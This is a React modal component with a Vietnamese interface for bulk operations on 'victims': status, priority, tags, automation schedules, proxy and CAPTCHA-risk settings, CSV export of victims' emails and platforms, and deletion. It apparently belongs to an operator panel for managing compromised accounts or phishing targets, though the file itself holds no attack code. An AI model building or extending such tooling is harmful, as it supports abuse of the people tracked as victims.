import React, { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Users,
  Play,
  Pause,
  Square,
  Trash2,
  Settings,
  Download,
  Upload,
  Tag,
  Shield,
  Globe,
  Zap,
  AlertTriangle,
} from "lucide-react";
import { useToast } from "@/components/ui/use-toast";

const VictimBulkOperationsModal = ({
  isOpen,
  onClose,
  selectedVictims,
  onBulkAction,
}) => {
  const { toast } = useToast();
  const [activeOperation, setActiveOperation] = useState("status");
  const [bulkSettings, setBulkSettings] = useState({
    status: "active",
    priority: "medium",
    category: "Personal",
    tags: [],
    automation: {
      enabled: false,
      frequency: "daily",
    },
    security: {
      enableProxy: false,
      captchaRisk: "low",
    },
  });

  const operations = [
    { id: "status", label: "Thay đổi trạng thái", icon: Play },
    { id: "priority", label: "Cập nhật độ ưu tiên", icon: AlertTriangle },
    { id: "tags", label: "Quản lý tags", icon: Tag },
    { id: "automation", label: "Cài đặt automation", icon: Zap },
    { id: "security", label: "Cấu hình bảo mật", icon: Shield },
    { id: "export", label: "Export dữ liệu", icon: Download },
    { id: "delete", label: "Xóa victim", icon: Trash2 },
  ];

  const handleBulkUpdate = () => {
    if (selectedVictims.length === 0) {
      toast({
        title: "Không có victim nào được chọn",
        description: "Vui lòng chọn ít nhất một victim",
        variant: "destructive",
      });
      return;
    }

    const operation = {
      type: activeOperation,
      settings: bulkSettings,
      victimIds: selectedVictims,
    };

    onBulkAction(operation);

    toast({
      title: "Thao tác hàng loạt thành công",
      description: `Đã áp dụng ${activeOperation} cho ${selectedVictims.length} victim(s)`,
    });

    onClose();
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="max-w-2xl">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <Users className="w-5 h-5" />
            Thao tác hàng loạt - {selectedVictims.length} victim(s)
          </DialogTitle>
          <DialogDescription>
            Thực hiện thao tác cho nhiều victim cùng lúc
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-6">
          {/* Operation Selection */}
          <Card>
            <CardHeader>
              <CardTitle>Chọn thao tác</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-2 gap-3">
                {operations.map((operation) => {
                  const Icon = operation.icon;
                  return (
                    <Button
                      key={operation.id}
                      variant={
                        activeOperation === operation.id ? "default" : "outline"
                      }
                      onClick={() => setActiveOperation(operation.id)}
                      className="flex items-center gap-2 justify-start"
                    >
                      <Icon className="w-4 h-4" />
                      {operation.label}
                    </Button>
                  );
                })}
              </div>
            </CardContent>
          </Card>

          {/* Operation Settings */}
          <Card>
            <CardHeader>
              <CardTitle>Cấu hình thao tác</CardTitle>
            </CardHeader>
            <CardContent>
              {activeOperation === "status" && (
                <div className="space-y-4">
                  <Label>Trạng thái mới</Label>
                  <Select
                    value={bulkSettings.status}
                    onValueChange={(value) =>
                      setBulkSettings((prev) => ({ ...prev, status: value }))
                    }
                  >
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="active">Active</SelectItem>
                      <SelectItem value="paused">Paused</SelectItem>
                      <SelectItem value="failed">Failed</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              )}

              {activeOperation === "priority" && (
                <div className="space-y-4">
                  <Label>Độ ưu tiên mới</Label>
                  <Select
                    value={bulkSettings.priority}
                    onValueChange={(value) =>
                      setBulkSettings((prev) => ({ ...prev, priority: value }))
                    }
                  >
                    <SelectTrigger>
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="low">Low</SelectItem>
                      <SelectItem value="medium">Medium</SelectItem>
                      <SelectItem value="high">High</SelectItem>
                      <SelectItem value="critical">Critical</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              )}

              {activeOperation === "automation" && (
                <div className="space-y-4">
                  <div className="flex items-center space-x-2">
                    <Switch
                      checked={bulkSettings.automation.enabled}
                      onCheckedChange={(checked) =>
                        setBulkSettings((prev) => ({
                          ...prev,
                          automation: { ...prev.automation, enabled: checked },
                        }))
                      }
                    />
                    <Label>Kích hoạt automation</Label>
                  </div>

                  {bulkSettings.automation.enabled && (
                    <Select
                      value={bulkSettings.automation.frequency}
                      onValueChange={(value) =>
                        setBulkSettings((prev) => ({
                          ...prev,
                          automation: { ...prev.automation, frequency: value },
                        }))
                      }
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="Chọn tần suất" />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="hourly">Hàng giờ</SelectItem>
                        <SelectItem value="daily">Hàng ngày</SelectItem>
                        <SelectItem value="weekly">Hàng tuần</SelectItem>
                      </SelectContent>
                    </Select>
                  )}
                </div>
              )}

              {activeOperation === "security" && (
                <div className="space-y-4">
                  <div className="flex items-center space-x-2">
                    <Switch
                      checked={bulkSettings.security.enableProxy}
                      onCheckedChange={(checked) =>
                        setBulkSettings((prev) => ({
                          ...prev,
                          security: { ...prev.security, enableProxy: checked },
                        }))
                      }
                    />
                    <Label>Bật proxy cho tất cả</Label>
                  </div>

                  <div className="space-y-2">
                    <Label>CAPTCHA Risk Level</Label>
                    <Select
                      value={bulkSettings.security.captchaRisk}
                      onValueChange={(value) =>
                        setBulkSettings((prev) => ({
                          ...prev,
                          security: { ...prev.security, captchaRisk: value },
                        }))
                      }
                    >
                      <SelectTrigger>
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="low">Low</SelectItem>
                        <SelectItem value="medium">Medium</SelectItem>
                        <SelectItem value="high">High</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                </div>
              )}

              {activeOperation === "export" && (
                <div className="space-y-4">
                  <p className="text-sm text-muted-foreground">
                    Export dữ liệu của {selectedVictims.length} victim(s) đã
                    chọn thành file CSV
                  </p>
                  <div className="flex items-center gap-2">
                    <Download className="w-4 h-4" />
                    <span className="text-sm">
                      Bao gồm: Email, Platform, Status, Priority, Tags
                    </span>
                  </div>
                </div>
              )}

              {activeOperation === "delete" && (
                <div className="space-y-4">
                  <div className="p-4 bg-red-50 dark:bg-red-950/20 border border-red-200 dark:border-red-800 rounded-lg">
                    <div className="flex items-start gap-3">
                      <AlertTriangle className="w-5 h-5 text-red-600 mt-0.5" />
                      <div>
                        <h3 className="font-medium text-red-800 dark:text-red-300">
                          Cảnh báo
                        </h3>
                        <p className="text-sm text-red-700 dark:text-red-400 mt-1">
                          Bạn sắp xóa {selectedVictims.length} victim(s). Thao
                          tác này không thể hoàn tác.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </CardContent>
          </Card>

          {/* Selected Victims Preview */}
          <Card>
            <CardHeader>
              <CardTitle>Victim đã chọn ({selectedVictims.length})</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="max-h-32 overflow-y-auto">
                <div className="flex flex-wrap gap-2">
                  {selectedVictims.slice(0, 10).map((id) => (
                    <Badge key={id} variant="outline">
                      ID: {id}
                    </Badge>
                  ))}
                  {selectedVictims.length > 10 && (
                    <Badge variant="secondary">
                      +{selectedVictims.length - 10} more
                    </Badge>
                  )}
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        <div className="flex justify-end gap-3 mt-6">
          <Button variant="outline" onClick={onClose}>
            Hủy
          </Button>
          <Button
            onClick={handleBulkUpdate}
            variant={activeOperation === "delete" ? "destructive" : "default"}
          >
            {activeOperation === "delete" ? "Xóa tất cả" : "Áp dụng"}
          </Button>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default VictimBulkOperationsModal;
